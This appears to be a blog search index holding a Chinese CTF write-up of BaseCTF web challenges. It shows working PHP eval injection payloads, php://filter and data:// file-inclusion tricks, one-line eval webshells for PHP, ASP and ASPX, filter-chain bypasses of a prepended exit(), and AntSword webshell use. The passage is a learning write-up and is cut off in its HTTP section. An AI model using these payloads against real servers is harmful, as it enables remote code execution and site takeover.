<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BaseCTF(WEB方向)</title>
    <link href="/2024/11/17/BaseCTF-WEB%E6%96%B9%E5%90%91/"/>
    <url>/2024/11/17/BaseCTF-WEB%E6%96%B9%E5%90%91/</url>
    
    <content type="html"><![CDATA[ <meta name="referrer" content="no-referrer">部分week3和week4的题目看了wp也没看懂怎么回事 所以没能复现出来<p>复现过程中涉及到的知识点都附在了复现过程的后面</p><h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730730326969-a3466ef4-7a46-468d-a4b6-ab15c934a873.png"></p><p>本题利用php代码中的eval()函数漏洞 通过get方式传入php代码来获取flag</p><p>构建payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://gz.imxbt.cn:20342/?DT=echo file_get_contents(&#x27;/flag&#x27;);<br></code></pre></td></tr></table></figure><p>除此之外还可以利用system函数可以执行shell命令来寻找flag</p><p>payload如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">http://gz.imxbt.cn:20342/?DT=system(&#x27;cat /flag&#x27;);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1730772939983-3879f4b7-45d3-4938-a033-a6f6f8e800e7.png"></p><p>注意：php中eval函数漏洞只能执行php代码，而使用shell命令需要借助system函数，并且传入的php代码必须以分号结尾。</p><p>扩展：若传入的参数在eval函数内的所要执行的函数，我们可闭合括号并输入分号构建多条php语句来执行所需命令。</p><p>例如：假设将下列代码替换成题中的eval函数语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">eval(&quot;var_dump($a);&quot;);<br></code></pre></td></tr></table></figure><p>通过闭合括号和添加分号构建payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?DT=);echo file_get_contents(&#x27;/flag&#x27;);var_dump(<br></code></pre></td></tr></table></figure><p>通过闭合括号构建php语句以实现绕过eval函数内的函数执行php语句</p><h2 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731408028995-b9edb8bc-161d-4f09-a5a0-e54cb45f2097.png"></p><p>通过代码审计需要经过三次判断</p><p>首先对于第一个判断, 他需要读取一个文件后内容是’Aura’，我们可以尝试通过<font style="color:#601BDE;">data:&#x2F;&#x2F;</font> <font style="color:#000000;">伪协议来进行读取</font></p><p><font style="color:#000000;">第二个判断的话, 我们要求页面的开头为</font><a href="http://jasmineaura.github.io/">http://jasmineaura.github.io</a></p><p>我们可以利用 <font style="color:#601BDE;">@</font>来进行隔断, 将<font style="color:#601BDE;">@</font>前面的内容当做用户名 （参考<a href="https://cloud.tencent.com/developer/article/2288231">链接</a>）</p><p><font style="color:#000000;">而我们需要页面的内容存在这个字符串, 我们可以就利用当前页面来显示, 于是构造</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">URL 的格式为 scheme://user:password@address:port/path?query#fragment<br>http://jasmineaura.github.io@127.0.0.1?query#已经收到Kengwang的礼物啦<br></code></pre></td></tr></table></figure><p>第三个的话是一个 include 点, 由于我们的 flag 在注释部分, 我们需要将其伪协议和过滤器来进行 base64 编码后输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>最后的payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">pen=data://text/plain;base64,QXVyYQ==<br>challenge=http://jasmineaura.github.io@127.0.0.1?query#已经收到Kengwang的礼物啦<br>gift=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>利用HackBar插件POST参数</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731479347348-42b6ae4a-fcea-48f6-a95e-b3b86b46d84e.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731479367493-f90ce832-37fc-496b-a76f-d83aaa43ecd7.png"></p><p>最后将密文解码就可得到flag</p><h3 id="关于PHP常见伪协议的使用"><a href="#关于PHP常见伪协议的使用" class="headerlink" title="关于PHP常见伪协议的使用"></a>关于PHP常见伪协议的使用</h3><p><font style="color:rgb(77, 77, 77);">php支持的伪协议有：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plain">1 file:// — 访问本地文件系统<br>2 http:// — 访问 HTTP(s) 网址<br>3 ftp:// — 访问 FTP(s) URLs<br>4 php:// — 访问各个输入/输出流（I/O streams）<br>5 zlib:// — 压缩流<br>6 data:// — 数据（RFC 2397）<br>7 glob:// — 查找匹配的文件路径模式<br>8 phar:// — PHP 归档<br>9 ssh2:// — Secure Shell 2<br>10 rar:// — RAR<br>11 ogg:// — 音频流<br>12 expect:// — 处理交互式的流<br></code></pre></td></tr></table></figure><p>这里只介绍几种常见伪协议的用法</p><h4 id="1、php-filter"><a href="#1、php-filter" class="headerlink" title="1、php:&#x2F;&#x2F;filter"></a>1、php:&#x2F;&#x2F;filter</h4><p><strong><font style="color:rgb(77, 77, 77);">php:&#x2F;&#x2F;filter</font></strong><font style="color:rgb(77, 77, 77);"> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</font></p><p><font style="color:rgb(77, 77, 77);">简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</font></p><p><strong><font style="color:rgb(77, 77, 77);">php:&#x2F;&#x2F;filter</font></strong><font style="color:rgb(77, 77, 77);">可以获取指定文件源码。当它与包含函数结合时，</font><strong><font style="color:rgb(77, 77, 77);">php:&#x2F;&#x2F;filter</font></strong><font style="color:rgb(77, 77, 77);">流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</font></p><p><font style="color:rgb(77, 77, 77);">协议参数</font></p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>resource&#x3D;&lt;要过滤的数据流&gt;</td><td><font style="color:rgb(79, 79, 79);">这个参数是必须的。它指定了你要筛选过滤的数据流。</font></td></tr><tr><td>read&#x3D;&lt;读链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（</td></tr><tr><td>write&#x3D;&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符（</td></tr><tr><td>&lt;；两个链的筛选列表&gt;</td><td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p><font style="color:rgb(77, 77, 77);">常用：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">php://filter/read=convert.base64-encode/resource=index.php<br>php://filter/resource=index.php<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">利用filter协议读文件，将index.php通过</font><font style="color:rgb(78, 161, 219) !important;">base64</font><font style="color:rgb(77, 77, 77);">编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。使用的convert.base64-encode，就是一种过滤器。</font></p><h5 id="利用filter伪协议绕过exit"><a href="#利用filter伪协议绕过exit" class="headerlink" title="利用filter伪协议绕过exit"></a><font style="color:rgb(77, 77, 77);">利用filter伪协议绕过exit</font></h5><h6 id="什么是exit"><a href="#什么是exit" class="headerlink" title="什么是exit"></a><font style="color:rgb(77, 77, 77);">什么是exit</font></h6><p><font style="color:rgb(77, 77, 77);">exit指的是在进行写入PHP文件操作时，执行了以下函数：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">亦或者</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">file_put_contents($content, &#x27;&lt;?php exit();?&gt;&#x27; . $content);<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">这样，当你插入一句话木马时，文件的内容是这样子的：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php exit();?&gt;<br><br>&lt;?php @eval($_POST[&#x27;snakin&#x27;]);?&gt;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。</font></p><h6 id="base64decode绕过"><a href="#base64decode绕过" class="headerlink" title="base64decode绕过"></a><font style="color:rgb(77, 77, 77);">base64decode绕过</font></h6><p><font style="color:rgb(77, 77, 77);">利用filter协议来绕过，看下这样的代码：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br><br>$content = &#x27;&lt;?php exit; ?&gt;&#x27;;<br><br>$content .= $_POST[&#x27;txt&#x27;];<br><br>file_put_contents($_POST[&#x27;filename&#x27;], $content);<br></code></pre></td></tr></table></figure><p><font style="color:#000000;">当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。</font></p><p><font style="color:#000000;">然而这里可以利用php:&#x2F;&#x2F;filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除exit。</font></p><p><font style="color:rgb(77, 77, 77);">base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，这个时候base64就相当于以下的过程：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br><br>$_GET[&#x27;txt&#x27;] = preg_replace(&#x27;|[^a-z0-9A-Z+/]|s&#x27;, &#x27;&#x27;, $_GET[&#x27;txt&#x27;]);<br><br>base64_decode($_GET[&#x27;txt&#x27;]);<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">所以，当</font><font style="color:#601BDE;">$content</font><font style="color:#000000;">包含</font><font style="color:#601BDE;"><?php exit;?></font><font style="color:rgb(77, 77, 77);">时，解码过程会先去除识别不了的字符，&lt; ; ? &gt;和空格等都将被去除，于是剩下的字符就只有</font><font style="color:#601BDE;">phpexit</font><font style="color:rgb(77, 77, 77);">以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。</font></p><p><font style="color:rgb(77, 77, 77);">这个时候后面再加上编码后的一句话木马，就可以getshell了。</font></p><h6 id="strip-tags绕过"><a href="#strip-tags绕过" class="headerlink" title="strip_tags绕过"></a><font style="color:rgb(79, 79, 79);">strip_tags绕过</font></h6><p><font style="color:rgb(77, 77, 77);">这个</font><font style="color:#601BDE;"><?php exit;?></font><font style="color:rgb(77, 77, 77);">实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php:&#x2F;&#x2F;filter刚好是支持这个方法的。</font></p><p><font style="color:rgb(77, 77, 77);">但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。</font></p><p><font style="color:rgb(77, 77, 77);">注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">php://filter/string.strip_tags|convert.base64-decode/resource=shell.php<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">更多绕过方法：</font><a href="https://xz.aliyun.com/t/8163?time__1311=n4+xnD0Dc7GQ0=DCDgADlhjm57ITj2GD0I2q=x#toc-2">file_put_content和死亡·杂糅代码之缘 - 先知社区</a></p><h4 id="2、data"><a href="#2、data" class="headerlink" title="2、data:&#x2F;&#x2F;"></a><font style="color:rgb(79, 79, 79);">2、data:&#x2F;&#x2F;</font></h4><p><font style="color:rgb(77, 77, 77);">数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</font></p><p><font style="color:rgb(77, 77, 77);">示例用法</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">1、data://text/plain,<br>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;<br> <br>2、data://text/plain;base64,<br>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<br><br></code></pre></td></tr></table></figure><p>除GET方法外POST同样也可以</p><p>例如题目中的</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731479347348-42b6ae4a-fcea-48f6-a95e-b3b86b46d84e.png?x-oss-process=image/format,webp/resize,w_1125,limit_0"></p><h4 id="3、file"><a href="#3、file" class="headerlink" title="3、file:&#x2F;&#x2F;"></a>3、file:&#x2F;&#x2F;</h4><p><font style="color:rgb(77, 77, 77);">用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响</font><br><font style="color:rgb(77, 77, 77);">file:&#x2F;&#x2F;协议主要用于访问文件(绝对路径、相对路径以及网络路径)</font><br><font style="color:rgb(77, 77, 77);">比如：<a href="http://www.xx.com/?file=file:///etc/passsword">http://www.xx.com?file=file:///etc/passsword</a></font></p><h4 id="4、php"><a href="#4、php" class="headerlink" title="4、php:&#x2F;&#x2F;"></a><font style="color:rgb(77, 77, 77);">4、php:&#x2F;&#x2F;</font></h4><p><font style="color:rgb(77, 77, 77);">在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用</font><br><font style="color:rgb(77, 77, 77);">php:&#x2F;&#x2F;作用为访问输入输出流</font></p><h4 id="5、php-input"><a href="#5、php-input" class="headerlink" title="5、php:&#x2F;&#x2F;input"></a><font style="color:rgb(77, 77, 77);">5、php:&#x2F;&#x2F;input</font></h4><p><strong><font style="color:rgb(77, 77, 77);">php:&#x2F;&#x2F;input</font></strong><font style="color:rgb(77, 77, 77);">可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</font></p><p><font style="color:rgb(77, 77, 77);">例如：</font></p><p><a href="http://127.0.0.1/cmd.php?cmd=php://input">http://127.0.0.1/cmd.php?cmd=php://input</a></p><p><font style="color:rgb(77, 77, 77);">POST数据：<?php phpinfo()?></font></p><p><font style="color:rgb(77, 77, 77);">注意：</font></p><p><font style="color:rgb(77, 77, 77);">当enctype&#x3D;”multipart&#x2F;form-data”的时候 php:&#x2F;&#x2F;input&#96; 是无效的</font></p><p><font style="color:rgb(77, 77, 77);">遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过</font></p><h4 id="6-zip"><a href="#6-zip" class="headerlink" title="6 zip:&#x2F;&#x2F;"></a><font style="color:rgb(79, 79, 79);">6 zip:&#x2F;&#x2F;</font></h4><p><font style="color:rgb(77, 77, 77);">zip:&#x2F;&#x2F; 可以访问压缩包里面的文件。当它与包含函数结合时，zip:&#x2F;&#x2F;流会被当作php文件执行。从而实现任意代码执行。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">zip://中只能传入绝对路径。<br>要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）<br>只需要是zip的压缩包即可，后缀名可以任意更改。<br>相同的类型的还有zlib://和bzip2://<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731483456000-93f8731c-4a4f-4866-9998-a2419b397385.png"></p><p>本文参考链接<a href="https://blog.csdn.net/cosmoslin/article/details/120695429?ops_request_misc=%257B%2522request%255Fid%2522%253A%252228579CCC-1D95-4F8C-AEA8-738D2D0C590C%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=28579CCC-1D95-4F8C-AEA8-738D2D0C590C&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120695429-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&spm=1018.2226.3001.4187">链接</a></p><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731398403979-ba2679e5-7618-40f1-a454-d2e05927782d.png"></p><p>题目名Upload提示上传任意文件 这里我们需要上传一句话木马并通过中国蚁剑连接从而查找隐藏在网站根目录下的flag</p><p>首先 创建并编写一句话木马文件</p><p>在桌面上新建一个文本文件并修改文件名称及文件后缀名为php</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731399637828-7baa0ff5-3dcf-4d58-8908-70a4b09b285c.png"></p><p>编辑文本内容后保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php @eval($_POST[0]);?&gt;<br></code></pre></td></tr></table></figure><p>将文件上传</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731399790321-5d883e04-a424-411d-a84a-6c839c80a2b5.png"></p><p>根据代码审计文件上传到了’uploads&#x2F;$file’下</p><p>打开中国蚁剑测试连接</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731400022279-b77a7739-22b2-419a-9a9b-65014bce9a1e.png"></p><p>测试连接成功后进入根目录查找flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731400130584-18e3fc26-9276-4bc9-8d5f-3e052816d211.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731400143627-b4e92f89-2e1e-49a7-946c-dc8d466a3353.png"></p><h3 id="关于一句话木马："><a href="#关于一句话木马：" class="headerlink" title="关于一句话木马："></a>关于一句话木马：</h3><p>主要参考文章：<a href="https://blog.csdn.net/weixin_39190897/article/details/86772765?ops_request_misc=%257B%2522request%255Fid%2522%253A%252209B31737-A115-41DD-BFCA-63527FE4A2BF%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=09B31737-A115-41DD-BFCA-63527FE4A2BF&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-86772765-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%ACphp%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&spm=1018.2226.3001.4187">链接</a></p><h4 id="概述："><a href="#概述：" class="headerlink" title="概述："></a><font style="color:rgb(79, 79, 79);">概述：</font></h4><p><font style="color:rgb(77, 77, 77);">在很多的渗透过程中，渗透人员会上传一句话木马（</font><strong><font style="color:rgb(77, 77, 77);">简称Webshell</font></strong><font style="color:rgb(77, 77, 77);">）到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此</font></p><p><font style="color:rgb(77, 77, 77);">先来看看最简单的一句话木马：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;<br></code></pre></td></tr></table></figure><p>【基本原理】利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀或中国蚁剑即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。</p><h4 id="入侵条件："><a href="#入侵条件：" class="headerlink" title="入侵条件："></a><font style="color:rgb(79, 79, 79);">入侵条件：</font></h4><p><font style="color:rgb(77, 77, 77);">其中，只要攻击者满足三个条件，就能实现成功入侵：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">木马上传成功，未被杀；<br>知道木马的路径在哪；<br>上传的木马能正常运行。<br></code></pre></td></tr></table></figure><h4 id="常见形式："><a href="#常见形式：" class="headerlink" title="常见形式："></a><font style="color:rgb(79, 79, 79);">常见形式：</font></h4><p><font style="color:rgb(77, 77, 77);">常见的一句话木马：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">php的一句话木马： &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;<br>asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">我们可以直接将这些语句插入到网站上的某个asp&#x2F;aspx&#x2F;php文件上，或者直接创建一个新的文件，在里面写入这些语句，然后把文件上传到网站上即可。</font></p><h4 id="基本原理："><a href="#基本原理：" class="headerlink" title="基本原理："></a><font style="color:rgb(79, 79, 79);">基本原理：</font></h4><p><font style="color:rgb(77, 77, 77);">首先我们先看一个原始而又简单的php一句话木马：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">这是php的一句话后门中最普遍的一种。它的工作原理是：</font><br><font style="color:rgb(77, 77, 77);">首先存在一个名为’cmd’的变量，’cmd’的取值为HTTP的POST方式。Web服务器对’cmd’取值以后，然后通过eval()函数执行’cmd’里面的内容。</font></p><h3 id="关于中国蚁剑的安装与使用："><a href="#关于中国蚁剑的安装与使用：" class="headerlink" title="关于中国蚁剑的安装与使用："></a><font style="color:rgb(77, 77, 77);">关于中国蚁剑的安装与使用：</font></h3><h4 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h4><p>安装过程可以参考<a href="https://blog.csdn.net/qq_60450539/article/details/138398460?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522080FB7DF-06C1-4710-A677-B0E2634E2829%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=080FB7DF-06C1-4710-A677-B0E2634E2829&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-138398460-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B&spm=1018.2226.3001.4187">链接</a></p><h4 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h4><p>进入中国蚁剑首页 在空白处右键点击添加数据</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731405840127-a03dd4ec-39d1-4ebb-a090-ae0cef1569df.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731405892899-e6f4a6a1-2333-4cbb-9d78-b6f16267cec1.png"></p><p>输入相应的网址及webshell的位置 例如题目中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">url/uploads/eval.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731400022279-b77a7739-22b2-419a-9a9b-65014bce9a1e.png?x-oss-process=image/format,webp"></p><p>连接密码为一句话木马中所写的参数</p><p>点击测试连接 若连接成功 点击添加后数据会加载出来</p><h2 id="A-Dark-Room"><a href="#A-Dark-Room" class="headerlink" title="A Dark Room"></a>A Dark Room</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731396545219-4417eb90-3002-4e43-9091-2ddd99bd1476.png"></p><p>flag藏在源代码里面有 鼠标右键打开查看发现flag</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731396600033-65d5af7e-3127-4bab-a5cb-ccb176cd21f1.png"></p><h4 id="查看源代码的方式："><a href="#查看源代码的方式：" class="headerlink" title="查看源代码的方式："></a>查看源代码的方式：</h4><p><font style="color:rgb(79, 79, 79);">1.右键选择检查 （或 F12 开发者工具）</font></p><p><font style="color:rgb(79, 79, 79);">2.view-source:url  （或 crtl+u）</font></p><p><font style="color:rgb(79, 79, 79);">3.bp抓包发送查看响应</font></p><p><font style="color:rgb(79, 79, 79);">4.访问根目录下的index.phps</font></p><h2 id="HTTP-是什么呀"><a href="#HTTP-是什么呀" class="headerlink" title="HTTP 是什么呀"></a><font style="color:rgb(79, 79, 79);">HTTP 是什么呀</font></h2><p>此题考察了我们对 HTTP 协议的理解</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731389978735-90186232-e215-4ccf-bd34-e64ae59c5acd.png"></p><p>需要我们利用抓包工具修改对应的需要的参数 我这里使用的是BurpSuite </p><p>修改相关的参数信息</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731391202130-88a12fac-f6af-4ce3-a97e-c46becd7ed8f.png"></p><p>发送后在BurpSuite中查看响应包</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49235244/1731391879128-82615dc4-dca0-4870-9e06-240b2137b4c6.png"></p><p>发现flag的是还需对其进行base64的解码</p><h3 id="关于http协议"><a href="#关于http协议" class="headerlink" title="关于http协议"></a>关于http协议</h3><p>主要参考文章<a href="https://blog.csdn.net/loss_rose777/article/details/132919997?ops_request_misc=%257B%2522request%255Fid%2522%253A%25224C00C2EA-636D-42B4-8792-C71D17CBD090%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=4C00C2EA-636D-42B4-8792-C71D17CBD090&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-132919997-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=http%E5%8D%8F%E8%AE%AE&spm=1018.2226.3001.4187">链接</a></p><h4 id="URL基本介绍及基本格式："><a href="#URL基本介绍及基本格式：" class="headerlink" title="URL基本介绍及基本格式："></a><font style="color:rgb(79, 79, 79);">URL基本介绍及基本格式：</font></h4><p><font style="color:rgb(77, 77, 77);">平时我们上网的网址就是URL，互联网上的每一个文件都有一个统一的URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它</font></p><p><font style="color:rgb(77, 77, 77);">URL的标准格式如下：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">协议类型：[//服务器地址][:端口号][/资源层级UNIX文件路径]文件名[?查询字符串][#片段标识符]<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">URL的完整格式如下：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">协议类型:[//[访问资源需要的凭证信息@]服务器地址[:端口号]][/资源层级 UNIX 文件路径]文件名[?查询字符串][#片段标识符]<br></code></pre></td></tr></table></figure><h4 id="认识http协议方法"><a href="#认识http协议方法" class="headerlink" title="认识http协议方法"></a><font style="color:rgb(79, 79, 79);">认识http协议方法</font></h4><p><font style="color:rgb(77, 77, 77);">HTTP中的方法，就是</font><a href="https://so.csdn.net/so/search?q=HTTP%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87&spm=1001.2101.3001.7020"><font style="color:rgb(77, 77, 77);">HTTP请求报文</font></a><font style="color:rgb(77, 77, 77);">中的首行的第一部分。</font></p><p><font style="color:rgb(79, 79, 79);">虽然HTTP中的方法有很多，但是我们主要用到的只有两个GET和POST</font></p><h5 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法:"></a><font style="color:rgb(79, 79, 79);">GET方法:</font></h5><h6 id="基本介绍："><a href="#基本介绍：" class="headerlink" 